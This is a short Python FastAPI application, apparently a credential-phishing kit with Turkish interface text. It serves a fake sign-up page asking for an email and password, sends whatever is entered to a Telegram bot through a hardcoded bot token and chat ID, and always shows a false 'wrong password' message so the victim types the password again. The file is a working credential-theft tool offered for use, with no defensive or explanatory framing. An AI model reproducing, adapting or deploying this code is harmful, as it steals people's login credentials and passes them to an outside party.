from fastapi import FastAPI
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import requests

app = FastAPI()

# 🔴 BOT BİLGİLERİ
BOT_TOKEN = "8834909037:AAFISe23LU4TWF3H-0McwePwtJiruPwSdqk"
CHAT_ID = "8359722718"


class Form(BaseModel):
    field1: str
    field2: str


@app.get("/", response_class=HTMLResponse)
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Mesaj Sistemi</title>

        <style>
            body {
                margin: 0;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                font-family: Arial;
                background: #f2f2f2;
            }

            .box {
                background: white;
                padding: 30px;
                border-radius: 12px;
                text-align: center;
                width: 300px;
                box-shadow: 0 0 10px rgba(0,0,0,0.2);
            }

            h2 {
                font-size: 28px;
                margin-bottom: 20px;
            }

            input {
                width: 90%;
                padding: 12px;
                margin: 10px 0;
                font-size: 16px;
                border-radius: 8px;
                border: 1px solid #ccc;
                outline: none;
            }

            button {
                width: 95%;
                padding: 12px;
                font-size: 16px;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                background: black;
                color: white;
            }

            button:hover {
                background: #333;
            }

            #error {
                display: none;
                color: red;
                margin-top: 15px;
                font-size: 15px;
                font-weight: bold;
            }
        </style>
    </head>

    <body>

        <div class="box">
            <h2>Kayit ol</h2>

            <input id="f1" placeholder="example@gmail.com">
            <input id="f2" type="password" placeholder="password">

            <button onclick="send()">Kayit ol</button>

            <p id="error">
                Şifreniz yanlış lütfen tekrar deneyin
            </p>
        </div>

        <script>
        async function send(){

            await fetch("/send", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    field1: document.getElementById("f1").value,
                    field2: document.getElementById("f2").value
                })
            });

            // Kırmızı hata mesajını göster
            document.getElementById("error").style.display = "block";
        }
        </script>

    </body>
    </html>
    """


@app.post("/send")
def send(data: Form):

    text = f"""
📩 Yeni Mesaj

🔹 Kutu 1: {data.field1}
🔹 Kutu 2: {data.field2}
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    requests.post(url, data={
        "chat_id": CHAT_ID,
        "text": text
    })

    return {"status": "ok"}
